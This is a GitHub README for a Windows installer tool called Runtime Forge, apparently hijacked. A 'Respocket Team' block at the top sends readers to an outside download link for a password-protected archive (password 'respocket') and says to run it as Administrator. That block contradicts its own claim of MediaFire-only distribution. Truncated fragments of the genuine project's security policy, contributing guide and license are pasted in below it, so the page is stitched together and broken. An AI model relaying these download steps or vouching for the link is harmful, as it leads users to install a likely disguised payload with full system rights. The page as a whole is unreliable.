<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

<p align="center"><img src="assets/banner.png" alt="Runtime Forge Banner"></p>

Runtime Forge
======================

<p align="center">


---

# Security policy

Runtime Forge downloads and runs installers with administrator rights, so security
reports are taken seriously.

## Reporting a vulnerability

Please **don't open a public issue**. Use GitHub's private reporting:
## How the app protects you (and where its limits are)

- Every installer is verified **before it runs and again immediately before execution**:
  a valid Authenticode signature from the expected publisher (via `WinVerifyTrust`) and/or a
  SHA-256 (GitHub's published digest, a vendor-published hash, or one pinned in the source).
  A failed check discards the file and is never retried.
- Packages installed through `winget` are checked by winget against its reviewed manifest hash.
- Installer staging lives beside the exe (admin-writable only) — never in a user-writable folder.
- `data/versions.json` (refreshed daily by `.github/workflows/update-versions.yml`) only *selects*


---

# Contributing

Thanks for wanting to help. Small, focused changes with a test are easiest to merge.

## Set up

```
## Adding a component (the usual contribution)

1. Pick the pattern in `core/catalog.py`: a **winget-backed** one (`_winget_component(...)` —
   a few lines, needs the winget ID and a way to detect it) or **your own pipeline** (download →
   `Trust(publishers=…, sha256=…)` → `run_exe` / `run_msi`).
2. Every download needs integrity: the vendor's signer name in `publishers`, and/or a SHA-256
   (from the release API, the vendor, or pinned). Check the real signer with `tools/verify_downloads.py`.
3. Say whether it's `optional` (never pre-checked), add a one-line `note`, and give it an uninstall
   when there's a safe one.
4. Add detection that works on a machine where it's installed (registry Uninstall key, a file, an
   Appx package…) — verify it against your own machine.
5. Tests in `tests/` (offline: fake the network, winget and the registry), then
   `tools\verify_downloads.py --only <key>`.
6. Update the README component list and `CHANGELOG.md`.

Or just open a **Suggest a component** issue and I'll add it.

## Conventions

- The tests are standalone scripts (`name: True/False` lines, `ALL_OK:`) — see any file in `tests/`.
- Don't add telemetry, don't weaken a verification step, and don't make an installer run from a
  user-writable folder.
- `HANDOFF.md` has the architecture map, the release recipe and the gotchas.


---

MIT License

Copyright (c) 2026 xechostormx

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
